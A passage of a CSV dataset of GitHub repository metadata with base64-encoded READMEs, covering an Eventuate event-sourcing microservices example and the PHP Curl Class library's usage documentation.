name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
OgoKKiBIb3cgdG8gZGVjb21wb3NlIGFuIGFwcGxpY2F0aW9uIGludG8gbWlj
cm9zZXJ2aWNlcyAtIGFzIGRlc2NyaWJlZCBiZWxvdyB0aGUgYXBwbGljYXRp
b24gY29uc2lzdHMgb2Ygc2V2ZXJhbCBzZXJ2aWNlcy4KRm9yIGV4YW1wbGUs
IGJhbmsgYWNjb3VudHMgYXJlIG1hbmFnZWQgYnkgb25lIHNlcnZpY2UsIG1v
bmV5IHRyYW5zZmVycyBieSBhbm90aGVyIHNlcnZpY2UuCgoqIFVzaW5nIGFu
IGV2ZW50LWRyaXZlbiBhcmNoaXRlY3R1cmUgdG8gYWNoaWV2ZSBkYXRhIGNv
bnNpc3RlbmN5IC0gcmF0aGVyIHRoYW4gdXNpbmcgdHJhZGl0aW9uYWwgZGlz
dHJpYnV0ZWQgdHJhbnNhY3Rpb24gdG8gbWFpbnRhaW4gZGF0YWJhc2UgY29u
c2lzdGVuY3kgdGhpcyBhcHBsaWNhdGlvbiB1c2VzIGFuIGV2ZW50dWFsbHkg
Y29uc2lzdGVudCwgZXZlbnQtZHJpdmVuIGFwcHJvYWNoLgoKKiBVc2luZyBl
dmVudCBzb3VyY2luZyB0byBpbXBsZW1lbnQgdGhlIGV2ZW50LWRyaXZlbiBh
cmNoaXRlY3R1cmUgLSB0aGUgZG9tYWluIGxvZ2ljIGNvbnNpc3RzIG9mIERv
bWFpbi1Ecml2ZW4gRGVzaWduIChEREQpIGFnZ3JlZ2F0ZXMgdGhhdCB1c2lu
ZyBldmVudCBzb3VyY2luZy4KCiogVXNpbmcgQ29tbWFuZCBRdWVyeSBSZXNw
b25zaWJpbGl0eSBTZWdyZWdhdGlvbiAoQ1FSUykgLSB1cGRhdGUgcmVxdWVz
dHMgKEhUVFAgUE9TVHMgYW5kIFBVVHMpIGFuZCB2aWV3IHJlcXVlc3RzIChI
VFRQIEdFVHMpIGFyZSBoYW5kbGVkIGJ5IHNlcGFyYXRlIHNlcnZpY2VzLgoK
KiBIb3cgZXZlbnQgc291cmNpbmcgZW5hYmxlcyBkZXBsb3ltZW50IGZsZXhp
YmlsaXR5IC0gdGhlIGFwcGxpY2F0aW9uIGNhbiBlaXRoZXIgYmUgZGVwbG95
ZWQgYXMgYSBtb25vbGl0aCBvciBhcyBtaWNyb3NlcnZpY2VzLgoKIyBBYm91
dCB0aGUgZXhhbXBsZSBhcHBsaWNhdGlvbgoKVGhpcyBleGFtcGxlIGFwcGxp
Y2F0aW9uIHByb3ZpZGVzIGEgUkVTVCBBUEkgZm9yIGNyZWF0aW5nIGFuZCB2
aWV3aW5nIGJhbmsgYWNjb3VudHMgYW5kIHRyYW5zZmVycmluZyBtb25leSBi
ZXR3ZWVuIHRoZW0uCgpUaGUgZm9sbG93aW5nIGRpYWdyYW0gc2hvd3MgdGhl
IGFyY2hpdGVjdHVyZToKCiFbTW9uZXkgdHJhbnNmZXIgYXJjaGl0ZWN0dXJl
XShodHRwczovL2dpdGh1Yi5jb20vY2VyL2V2ZW50LXNvdXJjaW5nLWV4YW1w
bGVzL3dpa2kvaS9hcHBsaWNhdGlvbmFyY2hpdGVjdHVyZS5wbmcpCgpUaGVy
ZSBhcmUgdGhlIGZvbGxvd2luZyAgc2VydmljZXM6CgoqIEN1c3RvbWVycyBT
ZXJ2aWNlIC0gUkVTVCBBUEkgZm9yIGNyZWF0aW5nIGN1c3RvbWVycwoqIEFj
Y291bnRzIFNlcnZpY2UgLSBSRVNUIEFQSSBmb3IgY3JlYXRpbmcgYWNjb3Vu
dHMKKiBUcmFuc2FjdGlvbnMgU2VydmljZSAtIFJFU1QgQVBJIGZvciB0cmFu
c2ZlcnJpbmcgbW9uZXkKKiBDdXN0b21lcnMgVmlldyBTZXJ2aWNlICAtIHN1
YnNjcmliZXMgdG8gZXZlbnRzIGFuZCB1cGRhdGVzIGEgTW9uZ29EQiBWaWV3
LCBhbmQgcHJvdmlkZXMgYW4gQVBJIGZvciByZXRyaWV2aW5nIGN1c3RvbWVy
cwoqIEFjY291bnRzIFZpZXcgU2VydmljZSAtIHN1YnNjcmliZXMgdG8gZXZl
bnRzIGFuZCB1cGRhdGVzIGEgTW9uZ29EQiBWaWV3LCBhbmQgcHJvdmlkZXMg
YW4gQVBJIGZvciByZXRyaWV2aW5nIGFjY291bnRzCgpUaGVyZSBpcyBhbHNv
IGFuIFtBUEkgZ2F0ZXdheV0oaHR0cDovL21pY3Jvc2VydmljZXMuaW8vcGF0
dGVybnMvYXBpZ2F0ZXdheS5odG1sKSBzZXJ2aWNlIHRoYXQgYWN0cyBhcyBh
IEZhY2FkZSBpbiBmcm9udCBvZiB0aGUgc2VydmljZXMuCgojIEFib3V0IHRo
ZSBleGFtcGxlcwoKVGhlcmUgYXJlIGN1cnJlbnRseSB0aGUgZm9sbG93aW5n
IHZlcnNpb25zIG9mIHRoZSBleGFtcGxlIGFwcGxpY2F0aW9uOgoKICAqIGph
dmEtc3ByaW5nIC0gYSBKYXZhIGFuZCBTcHJpbmcgQm9vdCBleGFtcGxlCiAg
KiBzY2FsYS1zcHJpbmcgLSBhIFNjYWxhIGFuZCBTcHJpbmcgQm9vdCBleGFt
cGxlIChOT1RFOiB0aGlzIHZlcnNpb24gaXMgbGFnZ2luZyB0aGUgSmF2YSBT
cHJpbmcgYW5kIGhhc24ndCBiZWVuIHVwZGF0ZWQgaW4gYSBsb25ndGltZS4p
CgpPdGhlciBleGFtcGxlcyB3aWxsIGJlIGFkZGVkIHNob3J0bHkgaW5jbHVk
aW5nIGEgU2NhbGEvUGxheSBleGFtcGxlLgoKRm9yIG1vcmUgaW5mb3JtYXRp
b24sIHBsZWFzZSBzZWUgdGhlIFt3aWtpXSguLi8uLi93aWtpKQoKIyBBYm91
dCB0aGUgRXZlbnR1YXRlIFBsYXRmb3JtCgpUaGUgYXBwbGljYXRpb24gaXMg
YnVpbHQgdXNpbmcgW0V2ZW50dWF0ZV0oaHR0cDovL2V2ZW50dWF0ZS5pby8p
LCB3aGljaCBpcyBhbiBhcHBsaWNhdGlvbiBwbGF0Zm9ybSBmb3Igd3JpdGlu
ZyB0cmFuc2FjdGlvbmFsIG1pY3Jvc2VydmljZXMuCkl0IHByb3ZpZGVzIGEg
c2ltcGxlIHlldCBwb3dlcmZ1bCBldmVudC1kcml2ZW4gcHJvZ3JhbW1pbmcg
bW9kZWwgdGhhdCBpcyBiYXNlZCBvbiBldmVudCBzb3VyY2luZyBhbmQgQ29t
bWFuZCBRdWVyeSBSZXNwb25zaWJpbGl0eSBTZWdyZWdhdGlvbiAoQ1FSUyku
CkV2ZW50dWF0ZSBzb2x2ZXMgdGhlIGRpc3RyaWJ1dGVkIGRhdGEgbWFuYWdl
bWVudCBwcm9ibGVtcyBpbmhlcmVudCBpbiBhIG1pY3Jvc2VydmljZSBhcmNo
aXRlY3R1cmUuCkl0IGNvbnNpc3RzIG9mIGEgc2NhbGFibGUsIGRpc3RyaWJ1
dGVkIGV2ZW50IHN0b3JlIGFuZCBjbGllbnQgbGlicmFyaWVzIGZvciB2YXJp
b3VzIGxhbmd1YWdlcyBhbmQgZnJhbWV3b3JrcyBpbmNsdWRpbmcgSmF2YSwg
U2NhbGEsIGFuZCB0aGUgU3ByaW5nIGZyYW1ld29yay4KClRoZXJlIGFyZSB0
d28gdmVyc2lvbnMgb2YgRXZlbnR1YXRlOgoKKiBbRXZlbnR1YXRlIFNhYVMg
c2VydmVyXShodHRwOi8vZXZlbnR1YXRlLmlvL3VzaW5nZXZlbnR1YXRlLmh0
bWwpIC0gdGhpcyBpcyBhIGZ1bGwgZmVhdHVyZWQgZXZlbnQgc3RvcmUgdGhh
dCBpcyBob3N0ZWQgb24gQVdTCiogW0V2ZW50dWF0ZSBMb2NhbF0oaHR0cDov
L2V2ZW50dWF0ZS5pby91c2luZ2V2ZW50dWF0ZS5odG1sKSAtIGFuIG9wZW4t
c291cmNlIGV2ZW50IHN0b3JlIHRoYXQgaXMgYnVpbHQgdXNpbmcgTXlTUUwg
YW5kIEthZmthCgpUaGVyZSBpcyBhbHNvIGFuIGVtYmVkZGVkIHRlc3QgZXZl
bnQgc3RvcmUsIHdoaWNoIGlzIGdyZWF0IGZvciBpbnRlZ3JhdGlvbiB0ZXN0
cy4KCiMgQnVpbGRpbmcgYW5kIHJ1bm5pbmcgdGhlIG1pY3Jvc2VydmljZXMK
ClRoaXMgaXMgYSBHcmFkbGUgcHJvamVjdC4KSG93ZXZlciwgeW91IGRvIG5v
dCBuZWVkIHRvIGluc3RhbGwgR3JhZGxlIHNpbmNlIGl0IHdpbGwgYmUgZG93
bmxvYWRlZCBhdXRvbWF0aWNhbGx5LgpZb3UganVzdCBuZWVkIHRvIGhhdmUg
SmF2YSA4IGluc3RhbGxlZC4KClRoZSBkZXRhaWxzIG9mIGhvdyB0byBidWls
ZCBhbmQgcnVuIHRoZSBzZXJ2aWNlcyBkZXBlbmQgc2xpZ2h0bHkgb24gd2hl
dGhlciB5b3UgYXJlIHVzaW5nIEV2ZW50dWF0ZSBTYWFTIG9yIEV2ZW50dWF0
ZSBMb2NhbC4KCiMjIEJ1aWxkaW5nIGFuZCBydW5uaW5nIHVzaW5nIEV2ZW50
dWF0ZSBTYWFTCgpGaXJzdCwgbXVzdCBbc2lnbiB1cCB0byBnZXQgeW91ciBj
cmVkZW50aWFsc10oaHR0cHM6Ly9zaWdudXAuZXZlbnR1YXRlLmlvLykgaW4g
b3JkZXIgdG8gZ2V0IGZyZWUgYWNjZXNzIHRvIHRoZSBTYWFTIHZlcnNpb24u
CgpOZXh0LCBidWlsZCB0aGUgYXBwbGljYXRpb24KCmBgYApjZCBqYXZhLXNw
cmluZwouL2dyYWRsZXcgYXNzZW1ibGUKYGBgCgpOZXh0LCB5b3UgY2FuIGxh
dW5jaCB0aGUgc2VydmljZXMgdXNpbmcgW0RvY2tlciBDb21wb3NlXShodHRw
czovL2RvY3MuZG9ja2VyLmNvbS9jb21wb3NlLyk6CgpgYGAKZG9ja2VyLWNv
bXBvc2UgdXAgLWQKYGBgCgpGaW5hbGx5LCB5b3UgY2FuIG9wZW4gdGhlIGhv
bWUgcGFnZSwgd2hpY2ggaXMgc2VydmVkIHVwIGJ5IHRoZSBBUEkgR2F0ZXdh
eTogYGh0dHA6Ly8kRE9DS0VSX0hPU1RfSVA6ODA4MGAKCk5vdGU6IGBET0NL
RVJfSE9TVF9JUGAgaXMgdGhlIElQIGFkZHJlc3Mgb2YgdGhlIG1hY2hpbmUg
d2hlcmUgRG9ja2VyIGlzIHJ1bm5pbmcsIGUuZy4gdGhlIElQIGFkZHJlc3Mg
b2YgdGhlIFZpcnR1YWxCb3ggVk0uCgojIyBCdWlsZGluZyBhbmQgcnVubmlu
ZyB1c2luZyBFdmVudHVhdGUgTG9jYWwKCkZpcnN0LCBidWlsZCB0aGUgYXBw
bGljYXRpb24KCmBgYApjZCBqYXZhLXNwcmluZwouL2dyYWRsZXcgYXNzZW1i
bGUgLVAgZXZlbnR1YXRlRHJpdmVyPWxvY2FsCmBgYAoKTmV4dCwgbGF1bmNo
IHRoZSBzZXJ2aWNlcyB1c2luZyBbRG9ja2VyIENvbXBvc2VdKGh0dHBzOi8v
ZG9jcy5kb2NrZXIuY29tL2NvbXBvc2UvKToKCmBgYApleHBvcnQgRE9DS0VS
X0hPU1RfSVA9Li4uCmRvY2tlci1jb21wb3NlIC1mIGRvY2tlci1jb21wb3Nl
LWV2ZW50dWF0ZS1sb2NhbC55bWwgdXAgLWQKYGBgCgpOb3RlOiBZb3UgbmVl
ZCB0byBzZXQgYERPQ0tFUl9IT1NUX0lQYCBiZWZvcmUgcnVubmluZyBEb2Nr
ZXIgQ29tcG9zZS4KVGhpcyBtdXN0IGJlIGFuIElQIGFkZHJlc3Mgb3IgcmVz
b2x2YWJsZSBob3N0bmFtZS4KSXQgY2Fubm90IGJlIGBsb2NhbGhvc3RgLgpT
ZWUgdGhpcyBbZ3VpZGUgdG8gc2V0dGluZyBgRE9DS0VSX0hPU1RfSVBgXSho
dHRwOi8vZXZlbnR1YXRlLmlvL2RvY3MvdXNpbmdkb2NrZXIuaHRtbCkgZm9y
IG1vcmUgaW5mb3JtYXRpb24uCgpGaW5hbGx5LCB5b3UgY2FuIG9wZW4gdGhl
IGhvbWUgcGFnZSwgd2hpY2ggaXMgc2VydmVkIHVwIGJ5IHRoZSBBUEkgR2F0
ZXdheTogYGh0dHA6Ly8kRE9DS0VSX0hPU1RfSVA6ODA4MGAK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'php-curl-class',12165811,b'PHP Curl Class makes it easy to send HTTP requests and integrate with web APIs',b'PHP',11,2379,,2379,False,b'https://api.github.com/repos/php-curl-class/php-curl-class/forks',"IyBQSFAgQ3VybCBDbGFzczogSFRUUCByZXF1ZXN0cyBtYWRlIGVhc3kKClsh
W10oaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9naXRodWIvcmVsZWFzZS9waHAt
Y3VybC1jbGFzcy9waHAtY3VybC1jbGFzcy5zdmcpXShodHRwczovL2dpdGh1
Yi5jb20vcGhwLWN1cmwtY2xhc3MvcGhwLWN1cmwtY2xhc3MvcmVsZWFzZXMv
KQpbIVtdKGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vZ2l0aHViL2xpY2Vuc2Uv
cGhwLWN1cmwtY2xhc3MvcGhwLWN1cmwtY2xhc3Muc3ZnKV0oaHR0cHM6Ly9n
aXRodWIuY29tL3BocC1jdXJsLWNsYXNzL3BocC1jdXJsLWNsYXNzL2Jsb2Iv
bWFzdGVyL0xJQ0VOU0UpClshW10oaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby90
cmF2aXMvcGhwLWN1cmwtY2xhc3MvcGhwLWN1cmwtY2xhc3Muc3ZnKV0oaHR0
cHM6Ly90cmF2aXMtY2kub3JnL3BocC1jdXJsLWNsYXNzL3BocC1jdXJsLWNs
YXNzLykKWyFbXShodHRwczovL2ltZy5zaGllbGRzLmlvL3BhY2thZ2lzdC9k
dC9waHAtY3VybC1jbGFzcy9waHAtY3VybC1jbGFzcy5zdmcpXShodHRwczov
L2dpdGh1Yi5jb20vcGhwLWN1cmwtY2xhc3MvcGhwLWN1cmwtY2xhc3MvcmVs
ZWFzZXMvKQoKUEhQIEN1cmwgQ2xhc3MgbWFrZXMgaXQgZWFzeSB0byBzZW5k
IEhUVFAgcmVxdWVzdHMgYW5kIGludGVncmF0ZSB3aXRoIHdlYiBBUElzLgoK
IVtQSFAgQ3VybCBDbGFzcyBzY3JlZW5jYXN0XSh3d3cvaW1nL3NjcmVlbmNh
c3QuZ2lmKQoKLS0tCgotIFtJbnN0YWxsYXRpb25dKCNpbnN0YWxsYXRpb24p
Ci0gW1JlcXVpcmVtZW50c10oI3JlcXVpcmVtZW50cykKLSBbUXVpY2sgU3Rh
cnQgYW5kIEV4YW1wbGVzXSgjcXVpY2stc3RhcnQtYW5kLWV4YW1wbGVzKQot
IFtBdmFpbGFibGUgTWV0aG9kc10oI2F2YWlsYWJsZS1tZXRob2RzKQotIFtT
ZWN1cml0eV0oI3NlY3VyaXR5KQotIFtUcm91Ymxlc2hvb3RpbmddKCN0cm91
Ymxlc2hvb3RpbmcpCi0gW1J1biBUZXN0c10oI3J1bi10ZXN0cykKLSBbQ29u
dHJpYnV0ZV0oI2NvbnRyaWJ1dGUpCgotLS0KCiMjIyBJbnN0YWxsYXRpb24K
ClRvIGluc3RhbGwgUEhQIEN1cmwgQ2xhc3MsIHNpbXBseToKCiAgICAkIGNv
bXBvc2VyIHJlcXVpcmUgcGhwLWN1cmwtY2xhc3MvcGhwLWN1cmwtY2xhc3MK
CkZvciBsYXRlc3QgY29tbWl0IHZlcnNpb246CgogICAgJCBjb21wb3NlciBy
ZXF1aXJlIHBocC1jdXJsLWNsYXNzL3BocC1jdXJsLWNsYXNzIEBkZXYKCiMj
IyBSZXF1aXJlbWVudHMKClBIUCBDdXJsIENsYXNzIHdvcmtzIHdpdGggUEhQ
IDUuMywgNS40LCA1LjUsIDUuNiwgNy4wLCA3LjEsIDcuMiwgNy4zLCBhbmQg
SEhWTS4KCiMjIyBRdWljayBTdGFydCBhbmQgRXhhbXBsZXMKCk1vcmUgZXhh
bXBsZXMgYXJlIGF2YWlsYWJsZSB1bmRlciBbL2V4YW1wbGVzXShodHRwczov
L2dpdGh1Yi5jb20vcGhwLWN1cmwtY2xhc3MvcGhwLWN1cmwtY2xhc3MvdHJl
ZS9tYXN0ZXIvZXhhbXBsZXMpLgoKYGBgcGhwCnJlcXVpcmUgX19ESVJfXyAu
ICcvdmVuZG9yL2F1dG9sb2FkLnBocCc7Cgp1c2UgXEN1cmxcQ3VybDsKCiRj
dXJsID0gbmV3IEN1cmwoKTsKJGN1cmwtPmdldCgnaHR0cHM6Ly93d3cuZXhh
bXBsZS5jb20vJyk7CgppZiAoJGN1cmwtPmVycm9yKSB7CiAgICBlY2hvICdF
cnJvcjogJyAuICRjdXJsLT5lcnJvckNvZGUgLiAnOiAnIC4gJGN1cmwtPmVy
cm9yTWVzc2FnZSAuICJcbiI7Cn0gZWxzZSB7CiAgICBlY2hvICdSZXNwb25z
ZTonIC4gIlxuIjsKICAgIHZhcl9kdW1wKCRjdXJsLT5yZXNwb25zZSk7Cn0K
YGBgCgpgYGBwaHAKLy8gaHR0cHM6Ly93d3cuZXhhbXBsZS5jb20vc2VhcmNo
P3E9a2V5d29yZAokY3VybCA9IG5ldyBDdXJsKCk7CiRjdXJsLT5nZXQoJ2h0
dHBzOi8vd3d3LmV4YW1wbGUuY29tL3NlYXJjaCcsIGFycmF5KAogICAgJ3En
ID0+ICdrZXl3b3JkJywKKSk7CmBgYAoKYGBgcGhwCiRjdXJsID0gbmV3IEN1
cmwoKTsKJGN1cmwtPnBvc3QoJ2h0dHBzOi8vd3d3LmV4YW1wbGUuY29tL2xv
Z2luLycsIGFycmF5KAogICAgJ3VzZXJuYW1lJyA9PiAnbXl1c2VybmFtZScs
CiAgICAncGFzc3dvcmQnID0+ICdteXBhc3N3b3JkJywKKSk7CmBgYAoKYGBg
cGhwCiRjdXJsID0gbmV3IEN1cmwoKTsKJGN1cmwtPnNldEJhc2ljQXV0aGVu
dGljYXRpb24oJ3VzZXJuYW1lJywgJ3Bhc3N3b3JkJyk7CiRjdXJsLT5zZXRV
c2VyQWdlbnQoJ015VXNlckFnZW50LzAuMC4xICgraHR0cHM6Ly93d3cuZXhh
bXBsZS5jb20vYm90Lmh0bWwpJyk7CiRjdXJsLT5zZXRSZWZlcnJlcignaHR0
cHM6Ly93d3cuZXhhbXBsZS5jb20vdXJsP3VybD1odHRwcyUzQSUyRiUyRnd3
dy5leGFtcGxlLmNvbSUyRicpOwokY3VybC0+c2V0SGVhZGVyKCdYLVJlcXVl
c3RlZC1XaXRoJywgJ1hNTEh0dHBSZXF1ZXN0Jyk7CiRjdXJsLT5zZXRDb29r
aWUoJ2tleScsICd2YWx1ZScpOwokY3VybC0+Z2V0KCdodHRwczovL3d3dy5l
eGFtcGxlLmNvbS8nKTsKCmlmICgkY3VybC0+ZXJyb3IpIHsKICAgIGVjaG8g
J0Vycm9yOiAnIC4gJGN1cmwtPmVycm9yQ29kZSAuICc6ICcgLiAkY3VybC0+
ZXJyb3JNZXNzYWdlIC4gIlxuIjsKfSBlbHNlIHsKICAgIGVjaG8gJ1Jlc3Bv
bnNlOicgLiAiXG4iOwogICAgdmFyX2R1bXAoJGN1cmwtPnJlc3BvbnNlKTsK
fQoKdmFyX2R1bXAoJGN1cmwtPnJlcXVlc3RIZWFkZXJzKTsKdmFyX2R1bXAo
JGN1cmwtPnJlc3BvbnNlSGVhZGVycyk7CmBgYAoKYGBgcGhwCiRjdXJsID0g
bmV3IEN1cmwoKTsKJGN1cmwtPnNldE9wdChDVVJMT1BUX0ZPTExPV0xPQ0FU
SU9OLCB0cnVlKTsKJGN1cmwtPmdldCgnaHR0cHM6Ly9zaG9ydG4uZXhhbXBs
ZS5jb20vYkhiVnNQJyk7CmBgYAoKYGBgcGhwCiRjdXJsID0gbmV3IEN1cmwo
KTsKJGN1cmwtPnB1dCgnaHR0cHM6Ly9hcGkuZXhhbXBsZS5jb20vdXNlci8n
LCBhcnJheSgKICAgICdmaXJzdF9uYW1lJyA9PiAnWmFjaCcsCiAgICAnbGFz
dF9uYW1lJyA9PiAnQm9yYm9hJywKKSk7CmBgYAoKYGBgcGhwCiRjdXJsID0g
bmV3IEN1cmwoKTsKJGN1cmwtPnBhdGNoKCdodHRwczovL2FwaS5leGFtcGxl
LmNvbS9wcm9maWxlLycsIGFycmF5KAogICAgJ2ltYWdlJyA9PiAnQHBhdGgv
dG8vZmlsZS5qcGcnLAopKTsKYGBgCgpgYGBwaHAKJGN1cmwgPSBuZXcgQ3Vy
bCgpOwokY3VybC0+cGF0Y2goJ2h0dHBzOi8vYXBpLmV4YW1wbGUuY29tL3By
b2ZpbGUvJywgYXJyYXkoCiAgICAnaW1hZ2UnID0+IG5ldyBDVVJMRmlsZSgn
cGF0aC90by9maWxlLmpwZycpLAopKTsKYGBgCgpgYGBwaHAKJGN1cmwgPSBu
ZXcgQ3VybCgpOwokY3VybC0+ZGVsZXRlKCdodHRwczovL2FwaS5leGFtcGxl
LmNvbS91c2VyLycsIGFycmF5KAogICAgJ2lkJyA9PiAnMTIzNCcsCikpOwpg
YGAKCmBgYHBocAovLyBFbmFibGUgYWxsIHN1cHBvcnRlZCBlbmNvZGluZyB0
eXBlcyBhbmQgZG93bmxvYWQgYSBmaWxlLgokY3VybCA9IG5ldyBDdXJsKCk7
CiRjdXJsLT5zZXRPcHQoQ1VSTE9QVF9FTkNPRElORyAsICcnKTsKJGN1cmwt
PmRvd25sb2FkKCdodHRwczovL3d3dy5leGFtcGxlLmNvbS9maWxlLmJpbics
ICcvdG1wL215ZmlsZS5iaW4nKTsKYGBgCgpgYGBwaHAKLy8gQ2FzZS1pbnNl
bnNpdGl2ZSBhY2Nlc3MgdG8gaGVhZGVycy4KJGN1cmwgPSBuZXcgQ3VybCgp
OwokY3VybC0+ZG93bmxvYWQoJ2h0dHBzOi8vd3d3LmV4YW1wbGUuY29tL2lt
YWdlLnBuZycsICcvdG1wL215aW1hZ2UucG5nJyk7CmVjaG8gJGN1cmwtPnJl
c3BvbnNlSGVhZGVyc1snQ29udGVudC1UeXBlJ10gLiAiXG4iOyAvLyBpbWFn
ZS9wbmcKZWNobyAkY3VybC0+cmVzcG9uc2VIZWFkZXJzWydDb05UZU5ULVR5
UEUnXSAuICJcbiI7IC8vIGltYWdlL3BuZwpgYGAKCmBgYHBocAovLyBNYW51
YWwgY2xlYW4gdXAuCiRjdXJsLT5jbG9zZSgpOwpgYGAKCmBgYHBocAovLyBF
eGFtcGxlIGFjY2VzcyB0byBjdXJsIG9iamVjdC4KY3VybF9zZXRfb3B0KCRj
dXJsLT5jdXJsLCBDVVJMT1BUX1VTRVJBR0VOVCwgJ01vemlsbGEvNC4wIChj
b21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjEnKTsKY3VybF9j
bG9zZSgkY3VybC0+Y3VybCk7CmBgYAoKYGBgcGhwCnJlcXVpcmUgX19ESVJf
XyAuICcvdmVuZG9yL2F1dG9sb2FkLnBocCc7Cgp1c2UgXEN1cmxcTXVsdGlD
dXJsOwoKLy8gUmVxdWVzdHMgaW4gcGFyYWxsZWwgd2l0aCBjYWxsYmFjayBm
dW5jdGlvbnMuCiRtdWx0aV9jdXJsID0gbmV3IE11bHRpQ3VybCgpOwoKJG11
bHRpX2N1cmwtPnN1Y2Nlc3MoZnVuY3Rpb24oJGluc3RhbmNlKSB7CiAgICBl
Y2hvICdjYWxsIHRvICInIC4gJGluc3RhbmNlLT51cmwgLiAnIiB3YXMgc3Vj
Y2Vzc2Z1bC4nIC4gIlxuIjsKICAgIGVjaG8gJ3Jlc3BvbnNlOicgLiAiXG4i
OwogICAgdmFyX2R1bXAoJGluc3RhbmNlLT5yZXNwb25zZSk7Cn0pOwokbXVs
dGlfY3VybC0+ZXJyb3IoZnVuY3Rpb24oJGluc3RhbmNlKSB7CiAgICBlY2hv
ICdjYWxsIHRvICInIC4gJGluc3RhbmNlLT51cmwgLiAnIiB3YXMgdW5zdWNj
ZXNzZnVsLicgLiAiXG4iOwogICAgZWNobyAnZXJyb3IgY29kZTogJyAuICRp
bnN0YW5jZS0+ZXJyb3JDb2RlIC4gIlxuIjsKICAgIGVjaG8gJ2Vycm9yIG1l
c3NhZ2U6ICcgLiAkaW5zdGFuY2UtPmVycm9yTWVzc2FnZSAuICJcbiI7Cn0p
OwokbXVsdGlfY3VybC0+Y29tcGxldGUoZnVuY3Rpb24oJGluc3RhbmNlKSB7
CiAgICBlY2hvICdjYWxsIGNvbXBsZXRlZCcgLiAiXG4iOwp9KTsKCiRtdWx0
aV9jdXJsLT5hZGRHZXQoJ2h0dHBzOi8vd3d3Lmdvb2dsZS5jb20vc2VhcmNo
JywgYXJyYXkoCiAgICAncScgPT4gJ2hlbGxvIHdvcmxkJywKKSk7CiRtdWx0
aV9jdXJsLT5hZGRHZXQoJ2h0dHBzOi8vZHVja2R1Y2tnby5jb20vJywgYXJy
YXkoCiAgICAncScgPT4gJ2hlbGxvIHdvcmxkJywKKSk7CiRtdWx0aV9jdXJs
LT5hZGRHZXQoJ2h0dHBzOi8vd3d3LmJpbmcuY29tL3NlYXJjaCcsIGFycmF5
KAogICAgJ3EnID0+ICdoZWxsbyB3b3JsZCcsCikpOwoKJG11bHRpX2N1cmwt
PnN0YXJ0KCk7IC8vIEJsb2NrcyB1bnRpbCBhbGwgaXRlbXMgaW4gdGhlIHF1
ZXVlIGhhdmUgYmVlbiBwcm9jZXNzZWQuCmBgYAoKTW9yZSBleGFtcGxlcyBh
cmUgYXZhaWxhYmxlIHVuZGVyIFsvZXhhbXBsZXNdKGh0dHBzOi8vZ2l0aHVi
LmNvbS9waHAtY3VybC1jbGFzcy9waHAtY3VybC1jbGFzcy90cmVlL21hc3Rl
ci9leGFtcGxlcykuCgojIyMgQXZhaWxhYmxlIE1ldGhvZHMKYGBgcGhwCkN1
cmw6Ol9fY29uc3RydWN0KCRiYXNlX3VybCA9IG51bGwpCkN1cmw6Ol9fZGVz
